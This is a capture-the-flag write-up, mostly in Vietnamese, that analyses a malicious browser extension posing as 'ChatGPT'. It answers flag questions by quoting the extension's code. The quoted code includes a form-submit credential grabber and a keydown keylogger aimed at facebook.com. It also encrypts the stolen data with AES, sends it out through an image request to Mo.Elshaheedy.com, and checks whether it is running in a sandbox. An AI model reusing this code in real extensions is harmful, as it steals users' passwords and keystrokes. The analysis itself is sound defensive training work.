# Mô tả

Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.

**Your task** is to perform a thorough analysis of this extension identify its malicious components.

# Phân tích

## Flag 1 + 2

Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?

Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?

Tìm kiếm trong file app.js sẽ thấy cách hoạt động thực sự của extension chatgpt giả này

```js
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

`Base64`

`www.facebook.com`

## Flag 3

Which type of HTML element is utilized by the extension to send stolen data?

Muốn biết dùng HTML element nào thì phải tìm trong các hàm exfiltrate, send để xem gửi đi kiểu gì

```js
function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }
```

Ở đây thấy được extension sử dụng tag <img> để tải dữ liệu đánh cắp được lên `Mo.Elshaheedy.com/collect?data=` sau đó là dữ liệu được mã hoá. Dữ liệu được được nhúng vào URL của ảnh dưới dạng tham số `data`

`<img>`

## Flag 4

What is the first specific condition in the code that triggers the extension to deactivate itself?

Ở app.js thì không tìm thấy gì nên chuyển qua xem `loader.js` được sử dụng để load thêm các hàm vào trong lúc đang chạy extension

```js
// Check if the browser is in a virtual environment
    if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
        alert("Virtual environment detected. Extension will disable itself.");
        chrome.runtime.onMessage.addListener(() => { return false; });
    }
```

Vậy là extension sẽ tự động tắt nếu đang chạy trong môi trường giả lập

`navigator.plugins.length === 0`

## Flag 5 + 6

Which event does the extension capture to track user input submitted through forms?

Which API or method does the extension use to capture and monitor user keystrokes?

```js
if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) {
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');

            if (username && password) {
                exfiltrateCredentials(username, password);
            }
        });

        document.addEventListener('keydown', function(event) {
            var key = event.key;
            exfiltrateData('keystroke', key);
        });
    }
```

Đây là đoạn mà extension giám sát và lưu lại keystrokes, dữ liệu cá nhân của người dùng

Để theo dõi các input vào form, extension sử dụng method `submit`, khi nhập các dữ liệu cá nhân như email, tk, mk,... thì sẽ thường nhập qua các ô form thì có thể dễ lấy được chúng hơn bằng cách này bởi nó chỉ lưu lại khi submit form khi gửi cho facebook

Để theo dõi keystrokes extension sử dụng `keydown` cái này sẽ lấy được người dùng đã nhập những gì trong thời gian extension được bật

## Flag 7

What is the domain where the extension transmits the exfiltrated data?

Đã giải thích ở trên

`Mo.Elshaheedy.com`

## Flag 8

Which function in the code is used to exfiltrate user credentials, including the username and password?

Hàm exfiltrate tất cả dữ liệu creds là

``` js
function exfiltrateCredentials(username, password) {
        const payload = { user: username, pass: password, site: window.location.hostname };
        const encryptedPayload = encryptPayload(JSON.stringify(payload));
        sendToServer(encryptedPayload);
    }
```

## Flag 9

Which encryption algorithm is applied to secure the data before sending?

```js
function encryptPayload(data) {
        const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
        const iv = CryptoJS.lib.WordArray.random(16);
        const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
        return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
    }
```

`AES`

## Flag 10

What does the extension access to store or manipulate session-related data and authentication information?

Muốn biết extension lưu và chỉnh sửa được các dữ liệu nào trong session thì nên xem file `manifest.json` mục `Permissions` thì sẽ biết được quyền truy cập của nó đến đâu

```json
"permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage",
    "webRequest",
    "webRequestBlocking",
    "cookies"
  ],
```

`cookies`